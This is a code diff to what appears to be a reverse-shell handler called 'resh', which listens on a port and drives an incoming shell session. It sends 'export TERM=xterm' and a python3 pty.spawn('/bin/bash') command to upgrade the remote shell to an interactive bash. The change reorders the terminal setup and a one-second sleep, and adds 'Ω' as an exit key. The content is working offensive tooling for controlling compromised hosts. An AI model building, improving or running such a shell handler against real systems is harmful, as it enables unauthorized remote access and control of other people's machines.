@@ -6,6 +6,7 @@ import sys
 import termios
 import threading
 import tty
+import time
 
 def setTTY():
 	fd = sys.stdin.fileno()
@@ -72,17 +73,19 @@ Server: resh [PORT]''')
 
 sock.send(b'export TERM=xterm\n')
 sock.send(b'python3 -c \'import pty;pty.spawn("/bin/bash")\'\n')
-rc(sock)
-fd, oldSet = setTTY()
 
+fd, oldSet = setTTY()
 thr = threading.Thread(target=recvLoop, args=(sock,))
 thr.start()
+
+time.sleep(1)
+rc(sock)
 
 while True:
 	c = sys.stdin.read(1)
 	if c == '\r':
 		c = '\n'
-	elif c == '²':
+	elif c == '²' or c == 'Ω':
 		sock.send(b'exit\n')
 		break
 	try:
